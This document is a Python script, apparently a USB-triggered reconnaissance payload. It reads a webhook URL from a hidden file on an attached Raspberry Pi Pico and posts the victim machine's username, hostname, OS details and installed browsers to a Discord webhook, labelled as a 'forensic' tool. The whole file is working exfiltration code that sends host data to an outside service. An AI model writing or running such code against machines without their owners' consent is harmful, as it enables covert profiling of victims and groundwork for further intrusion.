import os
import platform
import json
import socket
import getpass
import psutil
import requests
from datetime import datetime

# Function to read webhook from Raspberry Pi Pico
def get_webhook_from_pico():
    possible_drives = ["E:/", "F:/", "D:/", "/media/pi/", "/mnt/"]  # vary per OS
    for drive in possible_drives:
        path = os.path.join(drive, ".webhook")  # your file on Pico
        if os.path.exists(path):
            try:
                with open(path, "r") as file:
                    url = file.read().strip()
                    if url.startswith("http"):
                        return url
            except Exception as e:
                print("Error reading webhook:", e)
    return None

def get_user_info():
    return {
        "username": getpass.getuser(),
        "hostname": socket.gethostname(),
        "system": platform.system(),
        "release": platform.release(),
        "version": platform.version(),
        "machine": platform.machine(),
        "processor": platform.processor()
    }

def list_installed_browsers():
    browsers = []
    browser_paths = {
        "Chrome": os.path.expandvars(r"%ProgramFiles%\Google\Chrome\Application\chrome.exe"),
        "Firefox": os.path.expandvars(r"%ProgramFiles%\Mozilla Firefox\firefox.exe"),
        "Edge": os.path.expandvars(r"%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe")
    }
    for name, path in browser_paths.items():
        if os.path.exists(path):
            browsers.append(name)
    return browsers

def send_to_discord(webhook_url, info):
    headers = {
        "Content-Type": "application/json"
    }
    message = {
        "username": "ForensicTool",
        "content": "**Cyber Forensic Summary**",
        "embeds": [
            {
                "title": "System Info",
                "description": "```json\n" + json.dumps(info['user_info'], indent=2) + "\n```",
                "color": 5814783
            },
            {
                "title": "Browsers Installed",
                "description": "```" + "\n".join(info['browsers']) + "```",
                "color": 3447003
            }
        ]
    }
    try:
        response = requests.post(webhook_url, headers=headers, data=json.dumps(message))
        print("Webhook status:", response.status_code)
    except Exception as e:
        print("Failed to send to Discord:", e)

def main():
    webhook_url = get_webhook_from_pico()
    if not webhook_url:
        print("[ERROR] Could not find webhook URL from Pico")
        return

    info = {
        "user_info": get_user_info(),
        "browsers": list_installed_browsers()
    }

    send_to_discord(webhook_url, info)

if __name__ == "__main__":
    main()